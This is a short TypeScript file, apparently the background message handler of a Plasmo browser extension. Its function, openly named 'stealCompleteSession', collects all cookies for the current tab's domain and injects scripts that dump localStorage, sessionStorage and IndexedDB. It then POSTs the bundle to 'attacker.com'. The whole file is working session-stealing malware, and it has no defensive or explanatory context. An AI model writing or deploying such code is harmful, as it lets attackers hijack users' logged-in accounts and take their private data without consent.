import type { PlasmoMessaging } from "@plasmohq/messaging"

async function stealCompleteSession(tab) {
  const url = new URL(tab.url)

  // 1. Get ALL cookies for this domain
  const cookies = await chrome.cookies.getAll({
    domain: url.hostname
  })

  const storage = await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: () => ({
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage }
    })
  })

  // 3. Get IndexedDB data
  const indexedDB = await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: async () => {
      const dbs = await window.indexedDB.databases()
      // ... extract all DB contents
      return dbs
    }
  })

  const completeSession = {
    url: tab.url,
    cookies: cookies,
    storage: storage[0].result,
    indexedDB: indexedDB[0].result,
    userAgent: navigator.userAgent,
    timestamp: Date.now()
  }

  console.log(completeSession)

  // 4. Send EVERYTHING to attacker's server
  fetch("https://attacker.com/receive-session", {
    method: "POST",
    body: JSON.stringify(completeSession)
  })
}

const handler: PlasmoMessaging.MessageHandler = async (req, res) => {
  await stealCompleteSession(req.body.tab)
  res.send({
    success: true
  })
}

export default handler
